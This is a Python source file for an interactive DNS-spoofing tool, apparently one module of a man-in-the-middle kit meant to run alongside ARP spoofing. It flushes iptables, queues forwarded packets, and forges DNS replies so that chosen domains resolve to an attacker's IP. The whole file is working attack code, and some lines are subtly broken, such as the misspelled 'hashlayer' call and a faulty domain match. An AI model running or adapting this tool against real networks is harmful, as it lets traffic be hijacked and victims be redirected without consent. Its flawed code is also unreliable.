import sys
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


class DNS_Spoofer:
    def __init__(self):
        self.options = {"listening_ip": "INSERT_PRIVATE_IP"}
        self.domains = ["www.example.com"]
    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.hashlayer(DNSRR):
            try:
                scapy_packet = self.modify_packet(scapy_packet)
            except IndexError:
                pass
            sys.stdout = open(os.devnull, 'w')
            send(scapy_packet)
        packet.accept()
    def modify_packet(self, packet):
        qname = packet[DNSQR].qname
        if not qname in self.domains:
            return packet
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.options["listening_ip"])
        packet[DNS].ancount = 1
        sys.stdout = sys.__stdout__
        print("[+] Editing DNS from {} to {} [+]".format(packet[IP].src, self.options["listening_ip"]))
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet
    def start_dns(self):
        os.system("iptables --flush")
        QUEUE_NUM = 0
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        queue = NetfilterQueue()
        try:
            queue.bind(QUEUE_NUM, self.process_packet)
            queue.run()
        except KeyboardInterrupt:
            sys.stdout = sys.__stdout__
            print("Exiting...")
            os.system("iptables --flush")
    def printOptions(self):
        print("!-!-! DNS_Spoof !-!-!")
        print("IMPORTANT: Be sure to run this at the same time of the arp spoofing module")
        print("---Options---")
        print("listening_ip: {}".format(self.options["listening_ip"]))
        print("---Domains---")
        for i in self.domains:
            print(i)
        print("---Commands---")
        print("add [DOMAIN-NAME]) Add a domain to spoof")
        print("remove [DOMAIN-NAME]) Remove a domain to spoof")
        print("r) Run this module")
        print("op) Print this menu")
        print("set [option] [value]) Set a parameter for this module")
        print("b) Exit this module")
    
    def set_property(self, prop_name, prop_val):
        if prop_name in self.options:
            self.options[prop_name] = prop_val
        else:
            print("Option not found")

    def handle_menu(self):
        cmd = raw_input(": ")
        spaced_cmd = cmd.split(" ")
        if spaced_cmd[0] == "b":
            return 0
        elif spaced_cmd[0] == "op":
            os.system('cls' if os.name == 'nt' else 'clear')
            self.printOptions()
        elif spaced_cmd[0] == "r":
            try:
                self.start_dns()
            except:
                print("Something went wrong. Make sure your options are configured correctly and this program is being ran as a super user")
        elif spaced_cmd[0] == "set":
            if len(spaced_cmd) >= 2:
                new_item_val = ""
                for inp_op in spaced_cmd[2:]:
                    new_item_val = inp_op + " "
                self.set_property(spaced_cmd[1], new_item_val.strip())
            else:
                print("Not enough arguments")
        elif spaced_cmd[0] == "add":
            if len(spaced_cmd) >= 2:
                if spaced_cmd[1] not in self.domains:
                    self.domains.append(spaced_cmd[1])
                else:
                    print("Domain already in domain list")
            else:
                print("Not enough arguments")
        elif spaced_cmd[0] == "remove":
            if len(spaced_cmd) >= 2:
                if spaced_cmd[1] in self.domains:
                    self.domains.remove(spaced_cmd[1])
                else:
                    print("Couldn't find this domain in the list")
            else:
                print("Not enough arguments")
        else:
            print("Command not found")
        return 1
